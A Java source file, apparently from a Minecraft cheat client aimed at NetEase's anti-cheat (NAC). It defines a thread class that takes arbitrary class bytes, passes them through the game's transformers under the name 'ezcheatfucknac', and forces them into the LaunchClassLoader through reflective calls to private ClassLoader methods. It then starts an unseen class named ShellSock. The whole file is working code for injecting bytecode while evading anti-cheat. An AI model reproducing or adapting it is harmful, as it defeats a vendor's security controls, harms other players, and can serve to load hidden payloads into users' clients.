package com.netease.mc.modSS;

import org.objectweb.asm.*;
import net.minecraft.launchwrapper.*;
import java.security.*;
import java.lang.reflect.*;

public class RRRRRRX extends Thread
{
    private byte[][] classes;
    
    public RRRRRRX() {
        this.classes = null;
    }
    
    public RRRRRRX(final byte[][] classes) {
        this.classes = null;
        this.classes = classes;
        this.load();
    }
    
    public void load() {
        System.out.println("[NAC]Start Loading...");
        try {
            final Method RunTrans = LaunchClassLoader.class.getDeclaredMethod("runTransformers", String.class, String.class, byte[].class);
            RunTrans.setAccessible(true);
            for (final byte[] array : this.classes) {
                final ClassReader cr = new ClassReader(array);
                final String className = cr.getClassName().replaceAll("/", ".");
                final byte[] FORDEF = (byte[])RunTrans.invoke(Launch.classLoader, "net.minecraft.ezcheatfucknac", className, array);
                this.R(className, FORDEF, 0, FORDEF.length, Launch.classLoader.getClass().getProtectionDomain());
            }
            new ShellSock();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    protected final Class<?> R(final String name, final byte[] b, final int off, final int len, ProtectionDomain protectionDomain) throws ClassFormatError, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        final Method preDefineClass = ClassLoader.class.getDeclaredMethod("preDefineClass", String.class, ProtectionDomain.class);
        final Method defineClassSourceLocation = ClassLoader.class.getDeclaredMethod("defineClassSourceLocation", ProtectionDomain.class);
        final Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass1", String.class, byte[].class, Integer.TYPE, Integer.TYPE, ProtectionDomain.class, String.class);
        final Method postDefineClass = ClassLoader.class.getDeclaredMethod("postDefineClass", Class.class, ProtectionDomain.class);
        preDefineClass.setAccessible(true);
        defineClassSourceLocation.setAccessible(true);
        defineClass1.setAccessible(true);
        postDefineClass.setAccessible(true);
        protectionDomain = (ProtectionDomain)preDefineClass.invoke(Launch.classLoader, name, protectionDomain);
        final String source = (String)defineClassSourceLocation.invoke(Launch.classLoader, protectionDomain);
        final Class c = (Class)defineClass1.invoke(Launch.classLoader, name, b, off, len, protectionDomain, source);
        postDefineClass.invoke(Launch.classLoader, c, protectionDomain);
        return (Class<?>)c;
    }
}
